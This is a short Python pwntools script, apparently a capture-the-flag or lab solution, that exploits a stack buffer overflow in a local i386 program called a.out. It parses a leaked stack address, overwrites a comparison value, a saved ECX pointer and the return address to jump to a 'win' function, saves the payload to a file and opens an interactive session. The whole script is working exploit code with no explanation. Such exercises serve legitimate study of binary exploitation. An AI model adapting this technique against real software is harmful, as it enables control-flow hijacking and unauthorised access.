#!/usr/bin/env python3
import pwn

# Target: i386

OFFSET_CMP = 10
OFFSET_ECX = 62
OFFSET_RET = 94
CMP_VALUE = 1337
WIN_ADDR = 0x8049252

r = pwn.process("./a.out")
r.recvuntil("DEBUG: ")
sa = int(r.recv(10), 16)
pwn.log.info(f"Stack addr 0x{sa:08x}")    # DEBUG: 0xffffd35e

buf = b'A' * OFFSET_CMP
buf += pwn.p32(CMP_VALUE)
buf = buf.ljust(OFFSET_ECX, b'B')
buf += pwn.p32(sa + 98)
buf = buf.ljust(OFFSET_RET, b'C')
buf += pwn.p32(WIN_ADDR)

with open("payload.bin", "wb") as fp:
    fp.write(buf)

pwn.log.info("Payload")
print(pwn.hexdump(buf, width=16))

r.writeline(buf)
r.interactive()
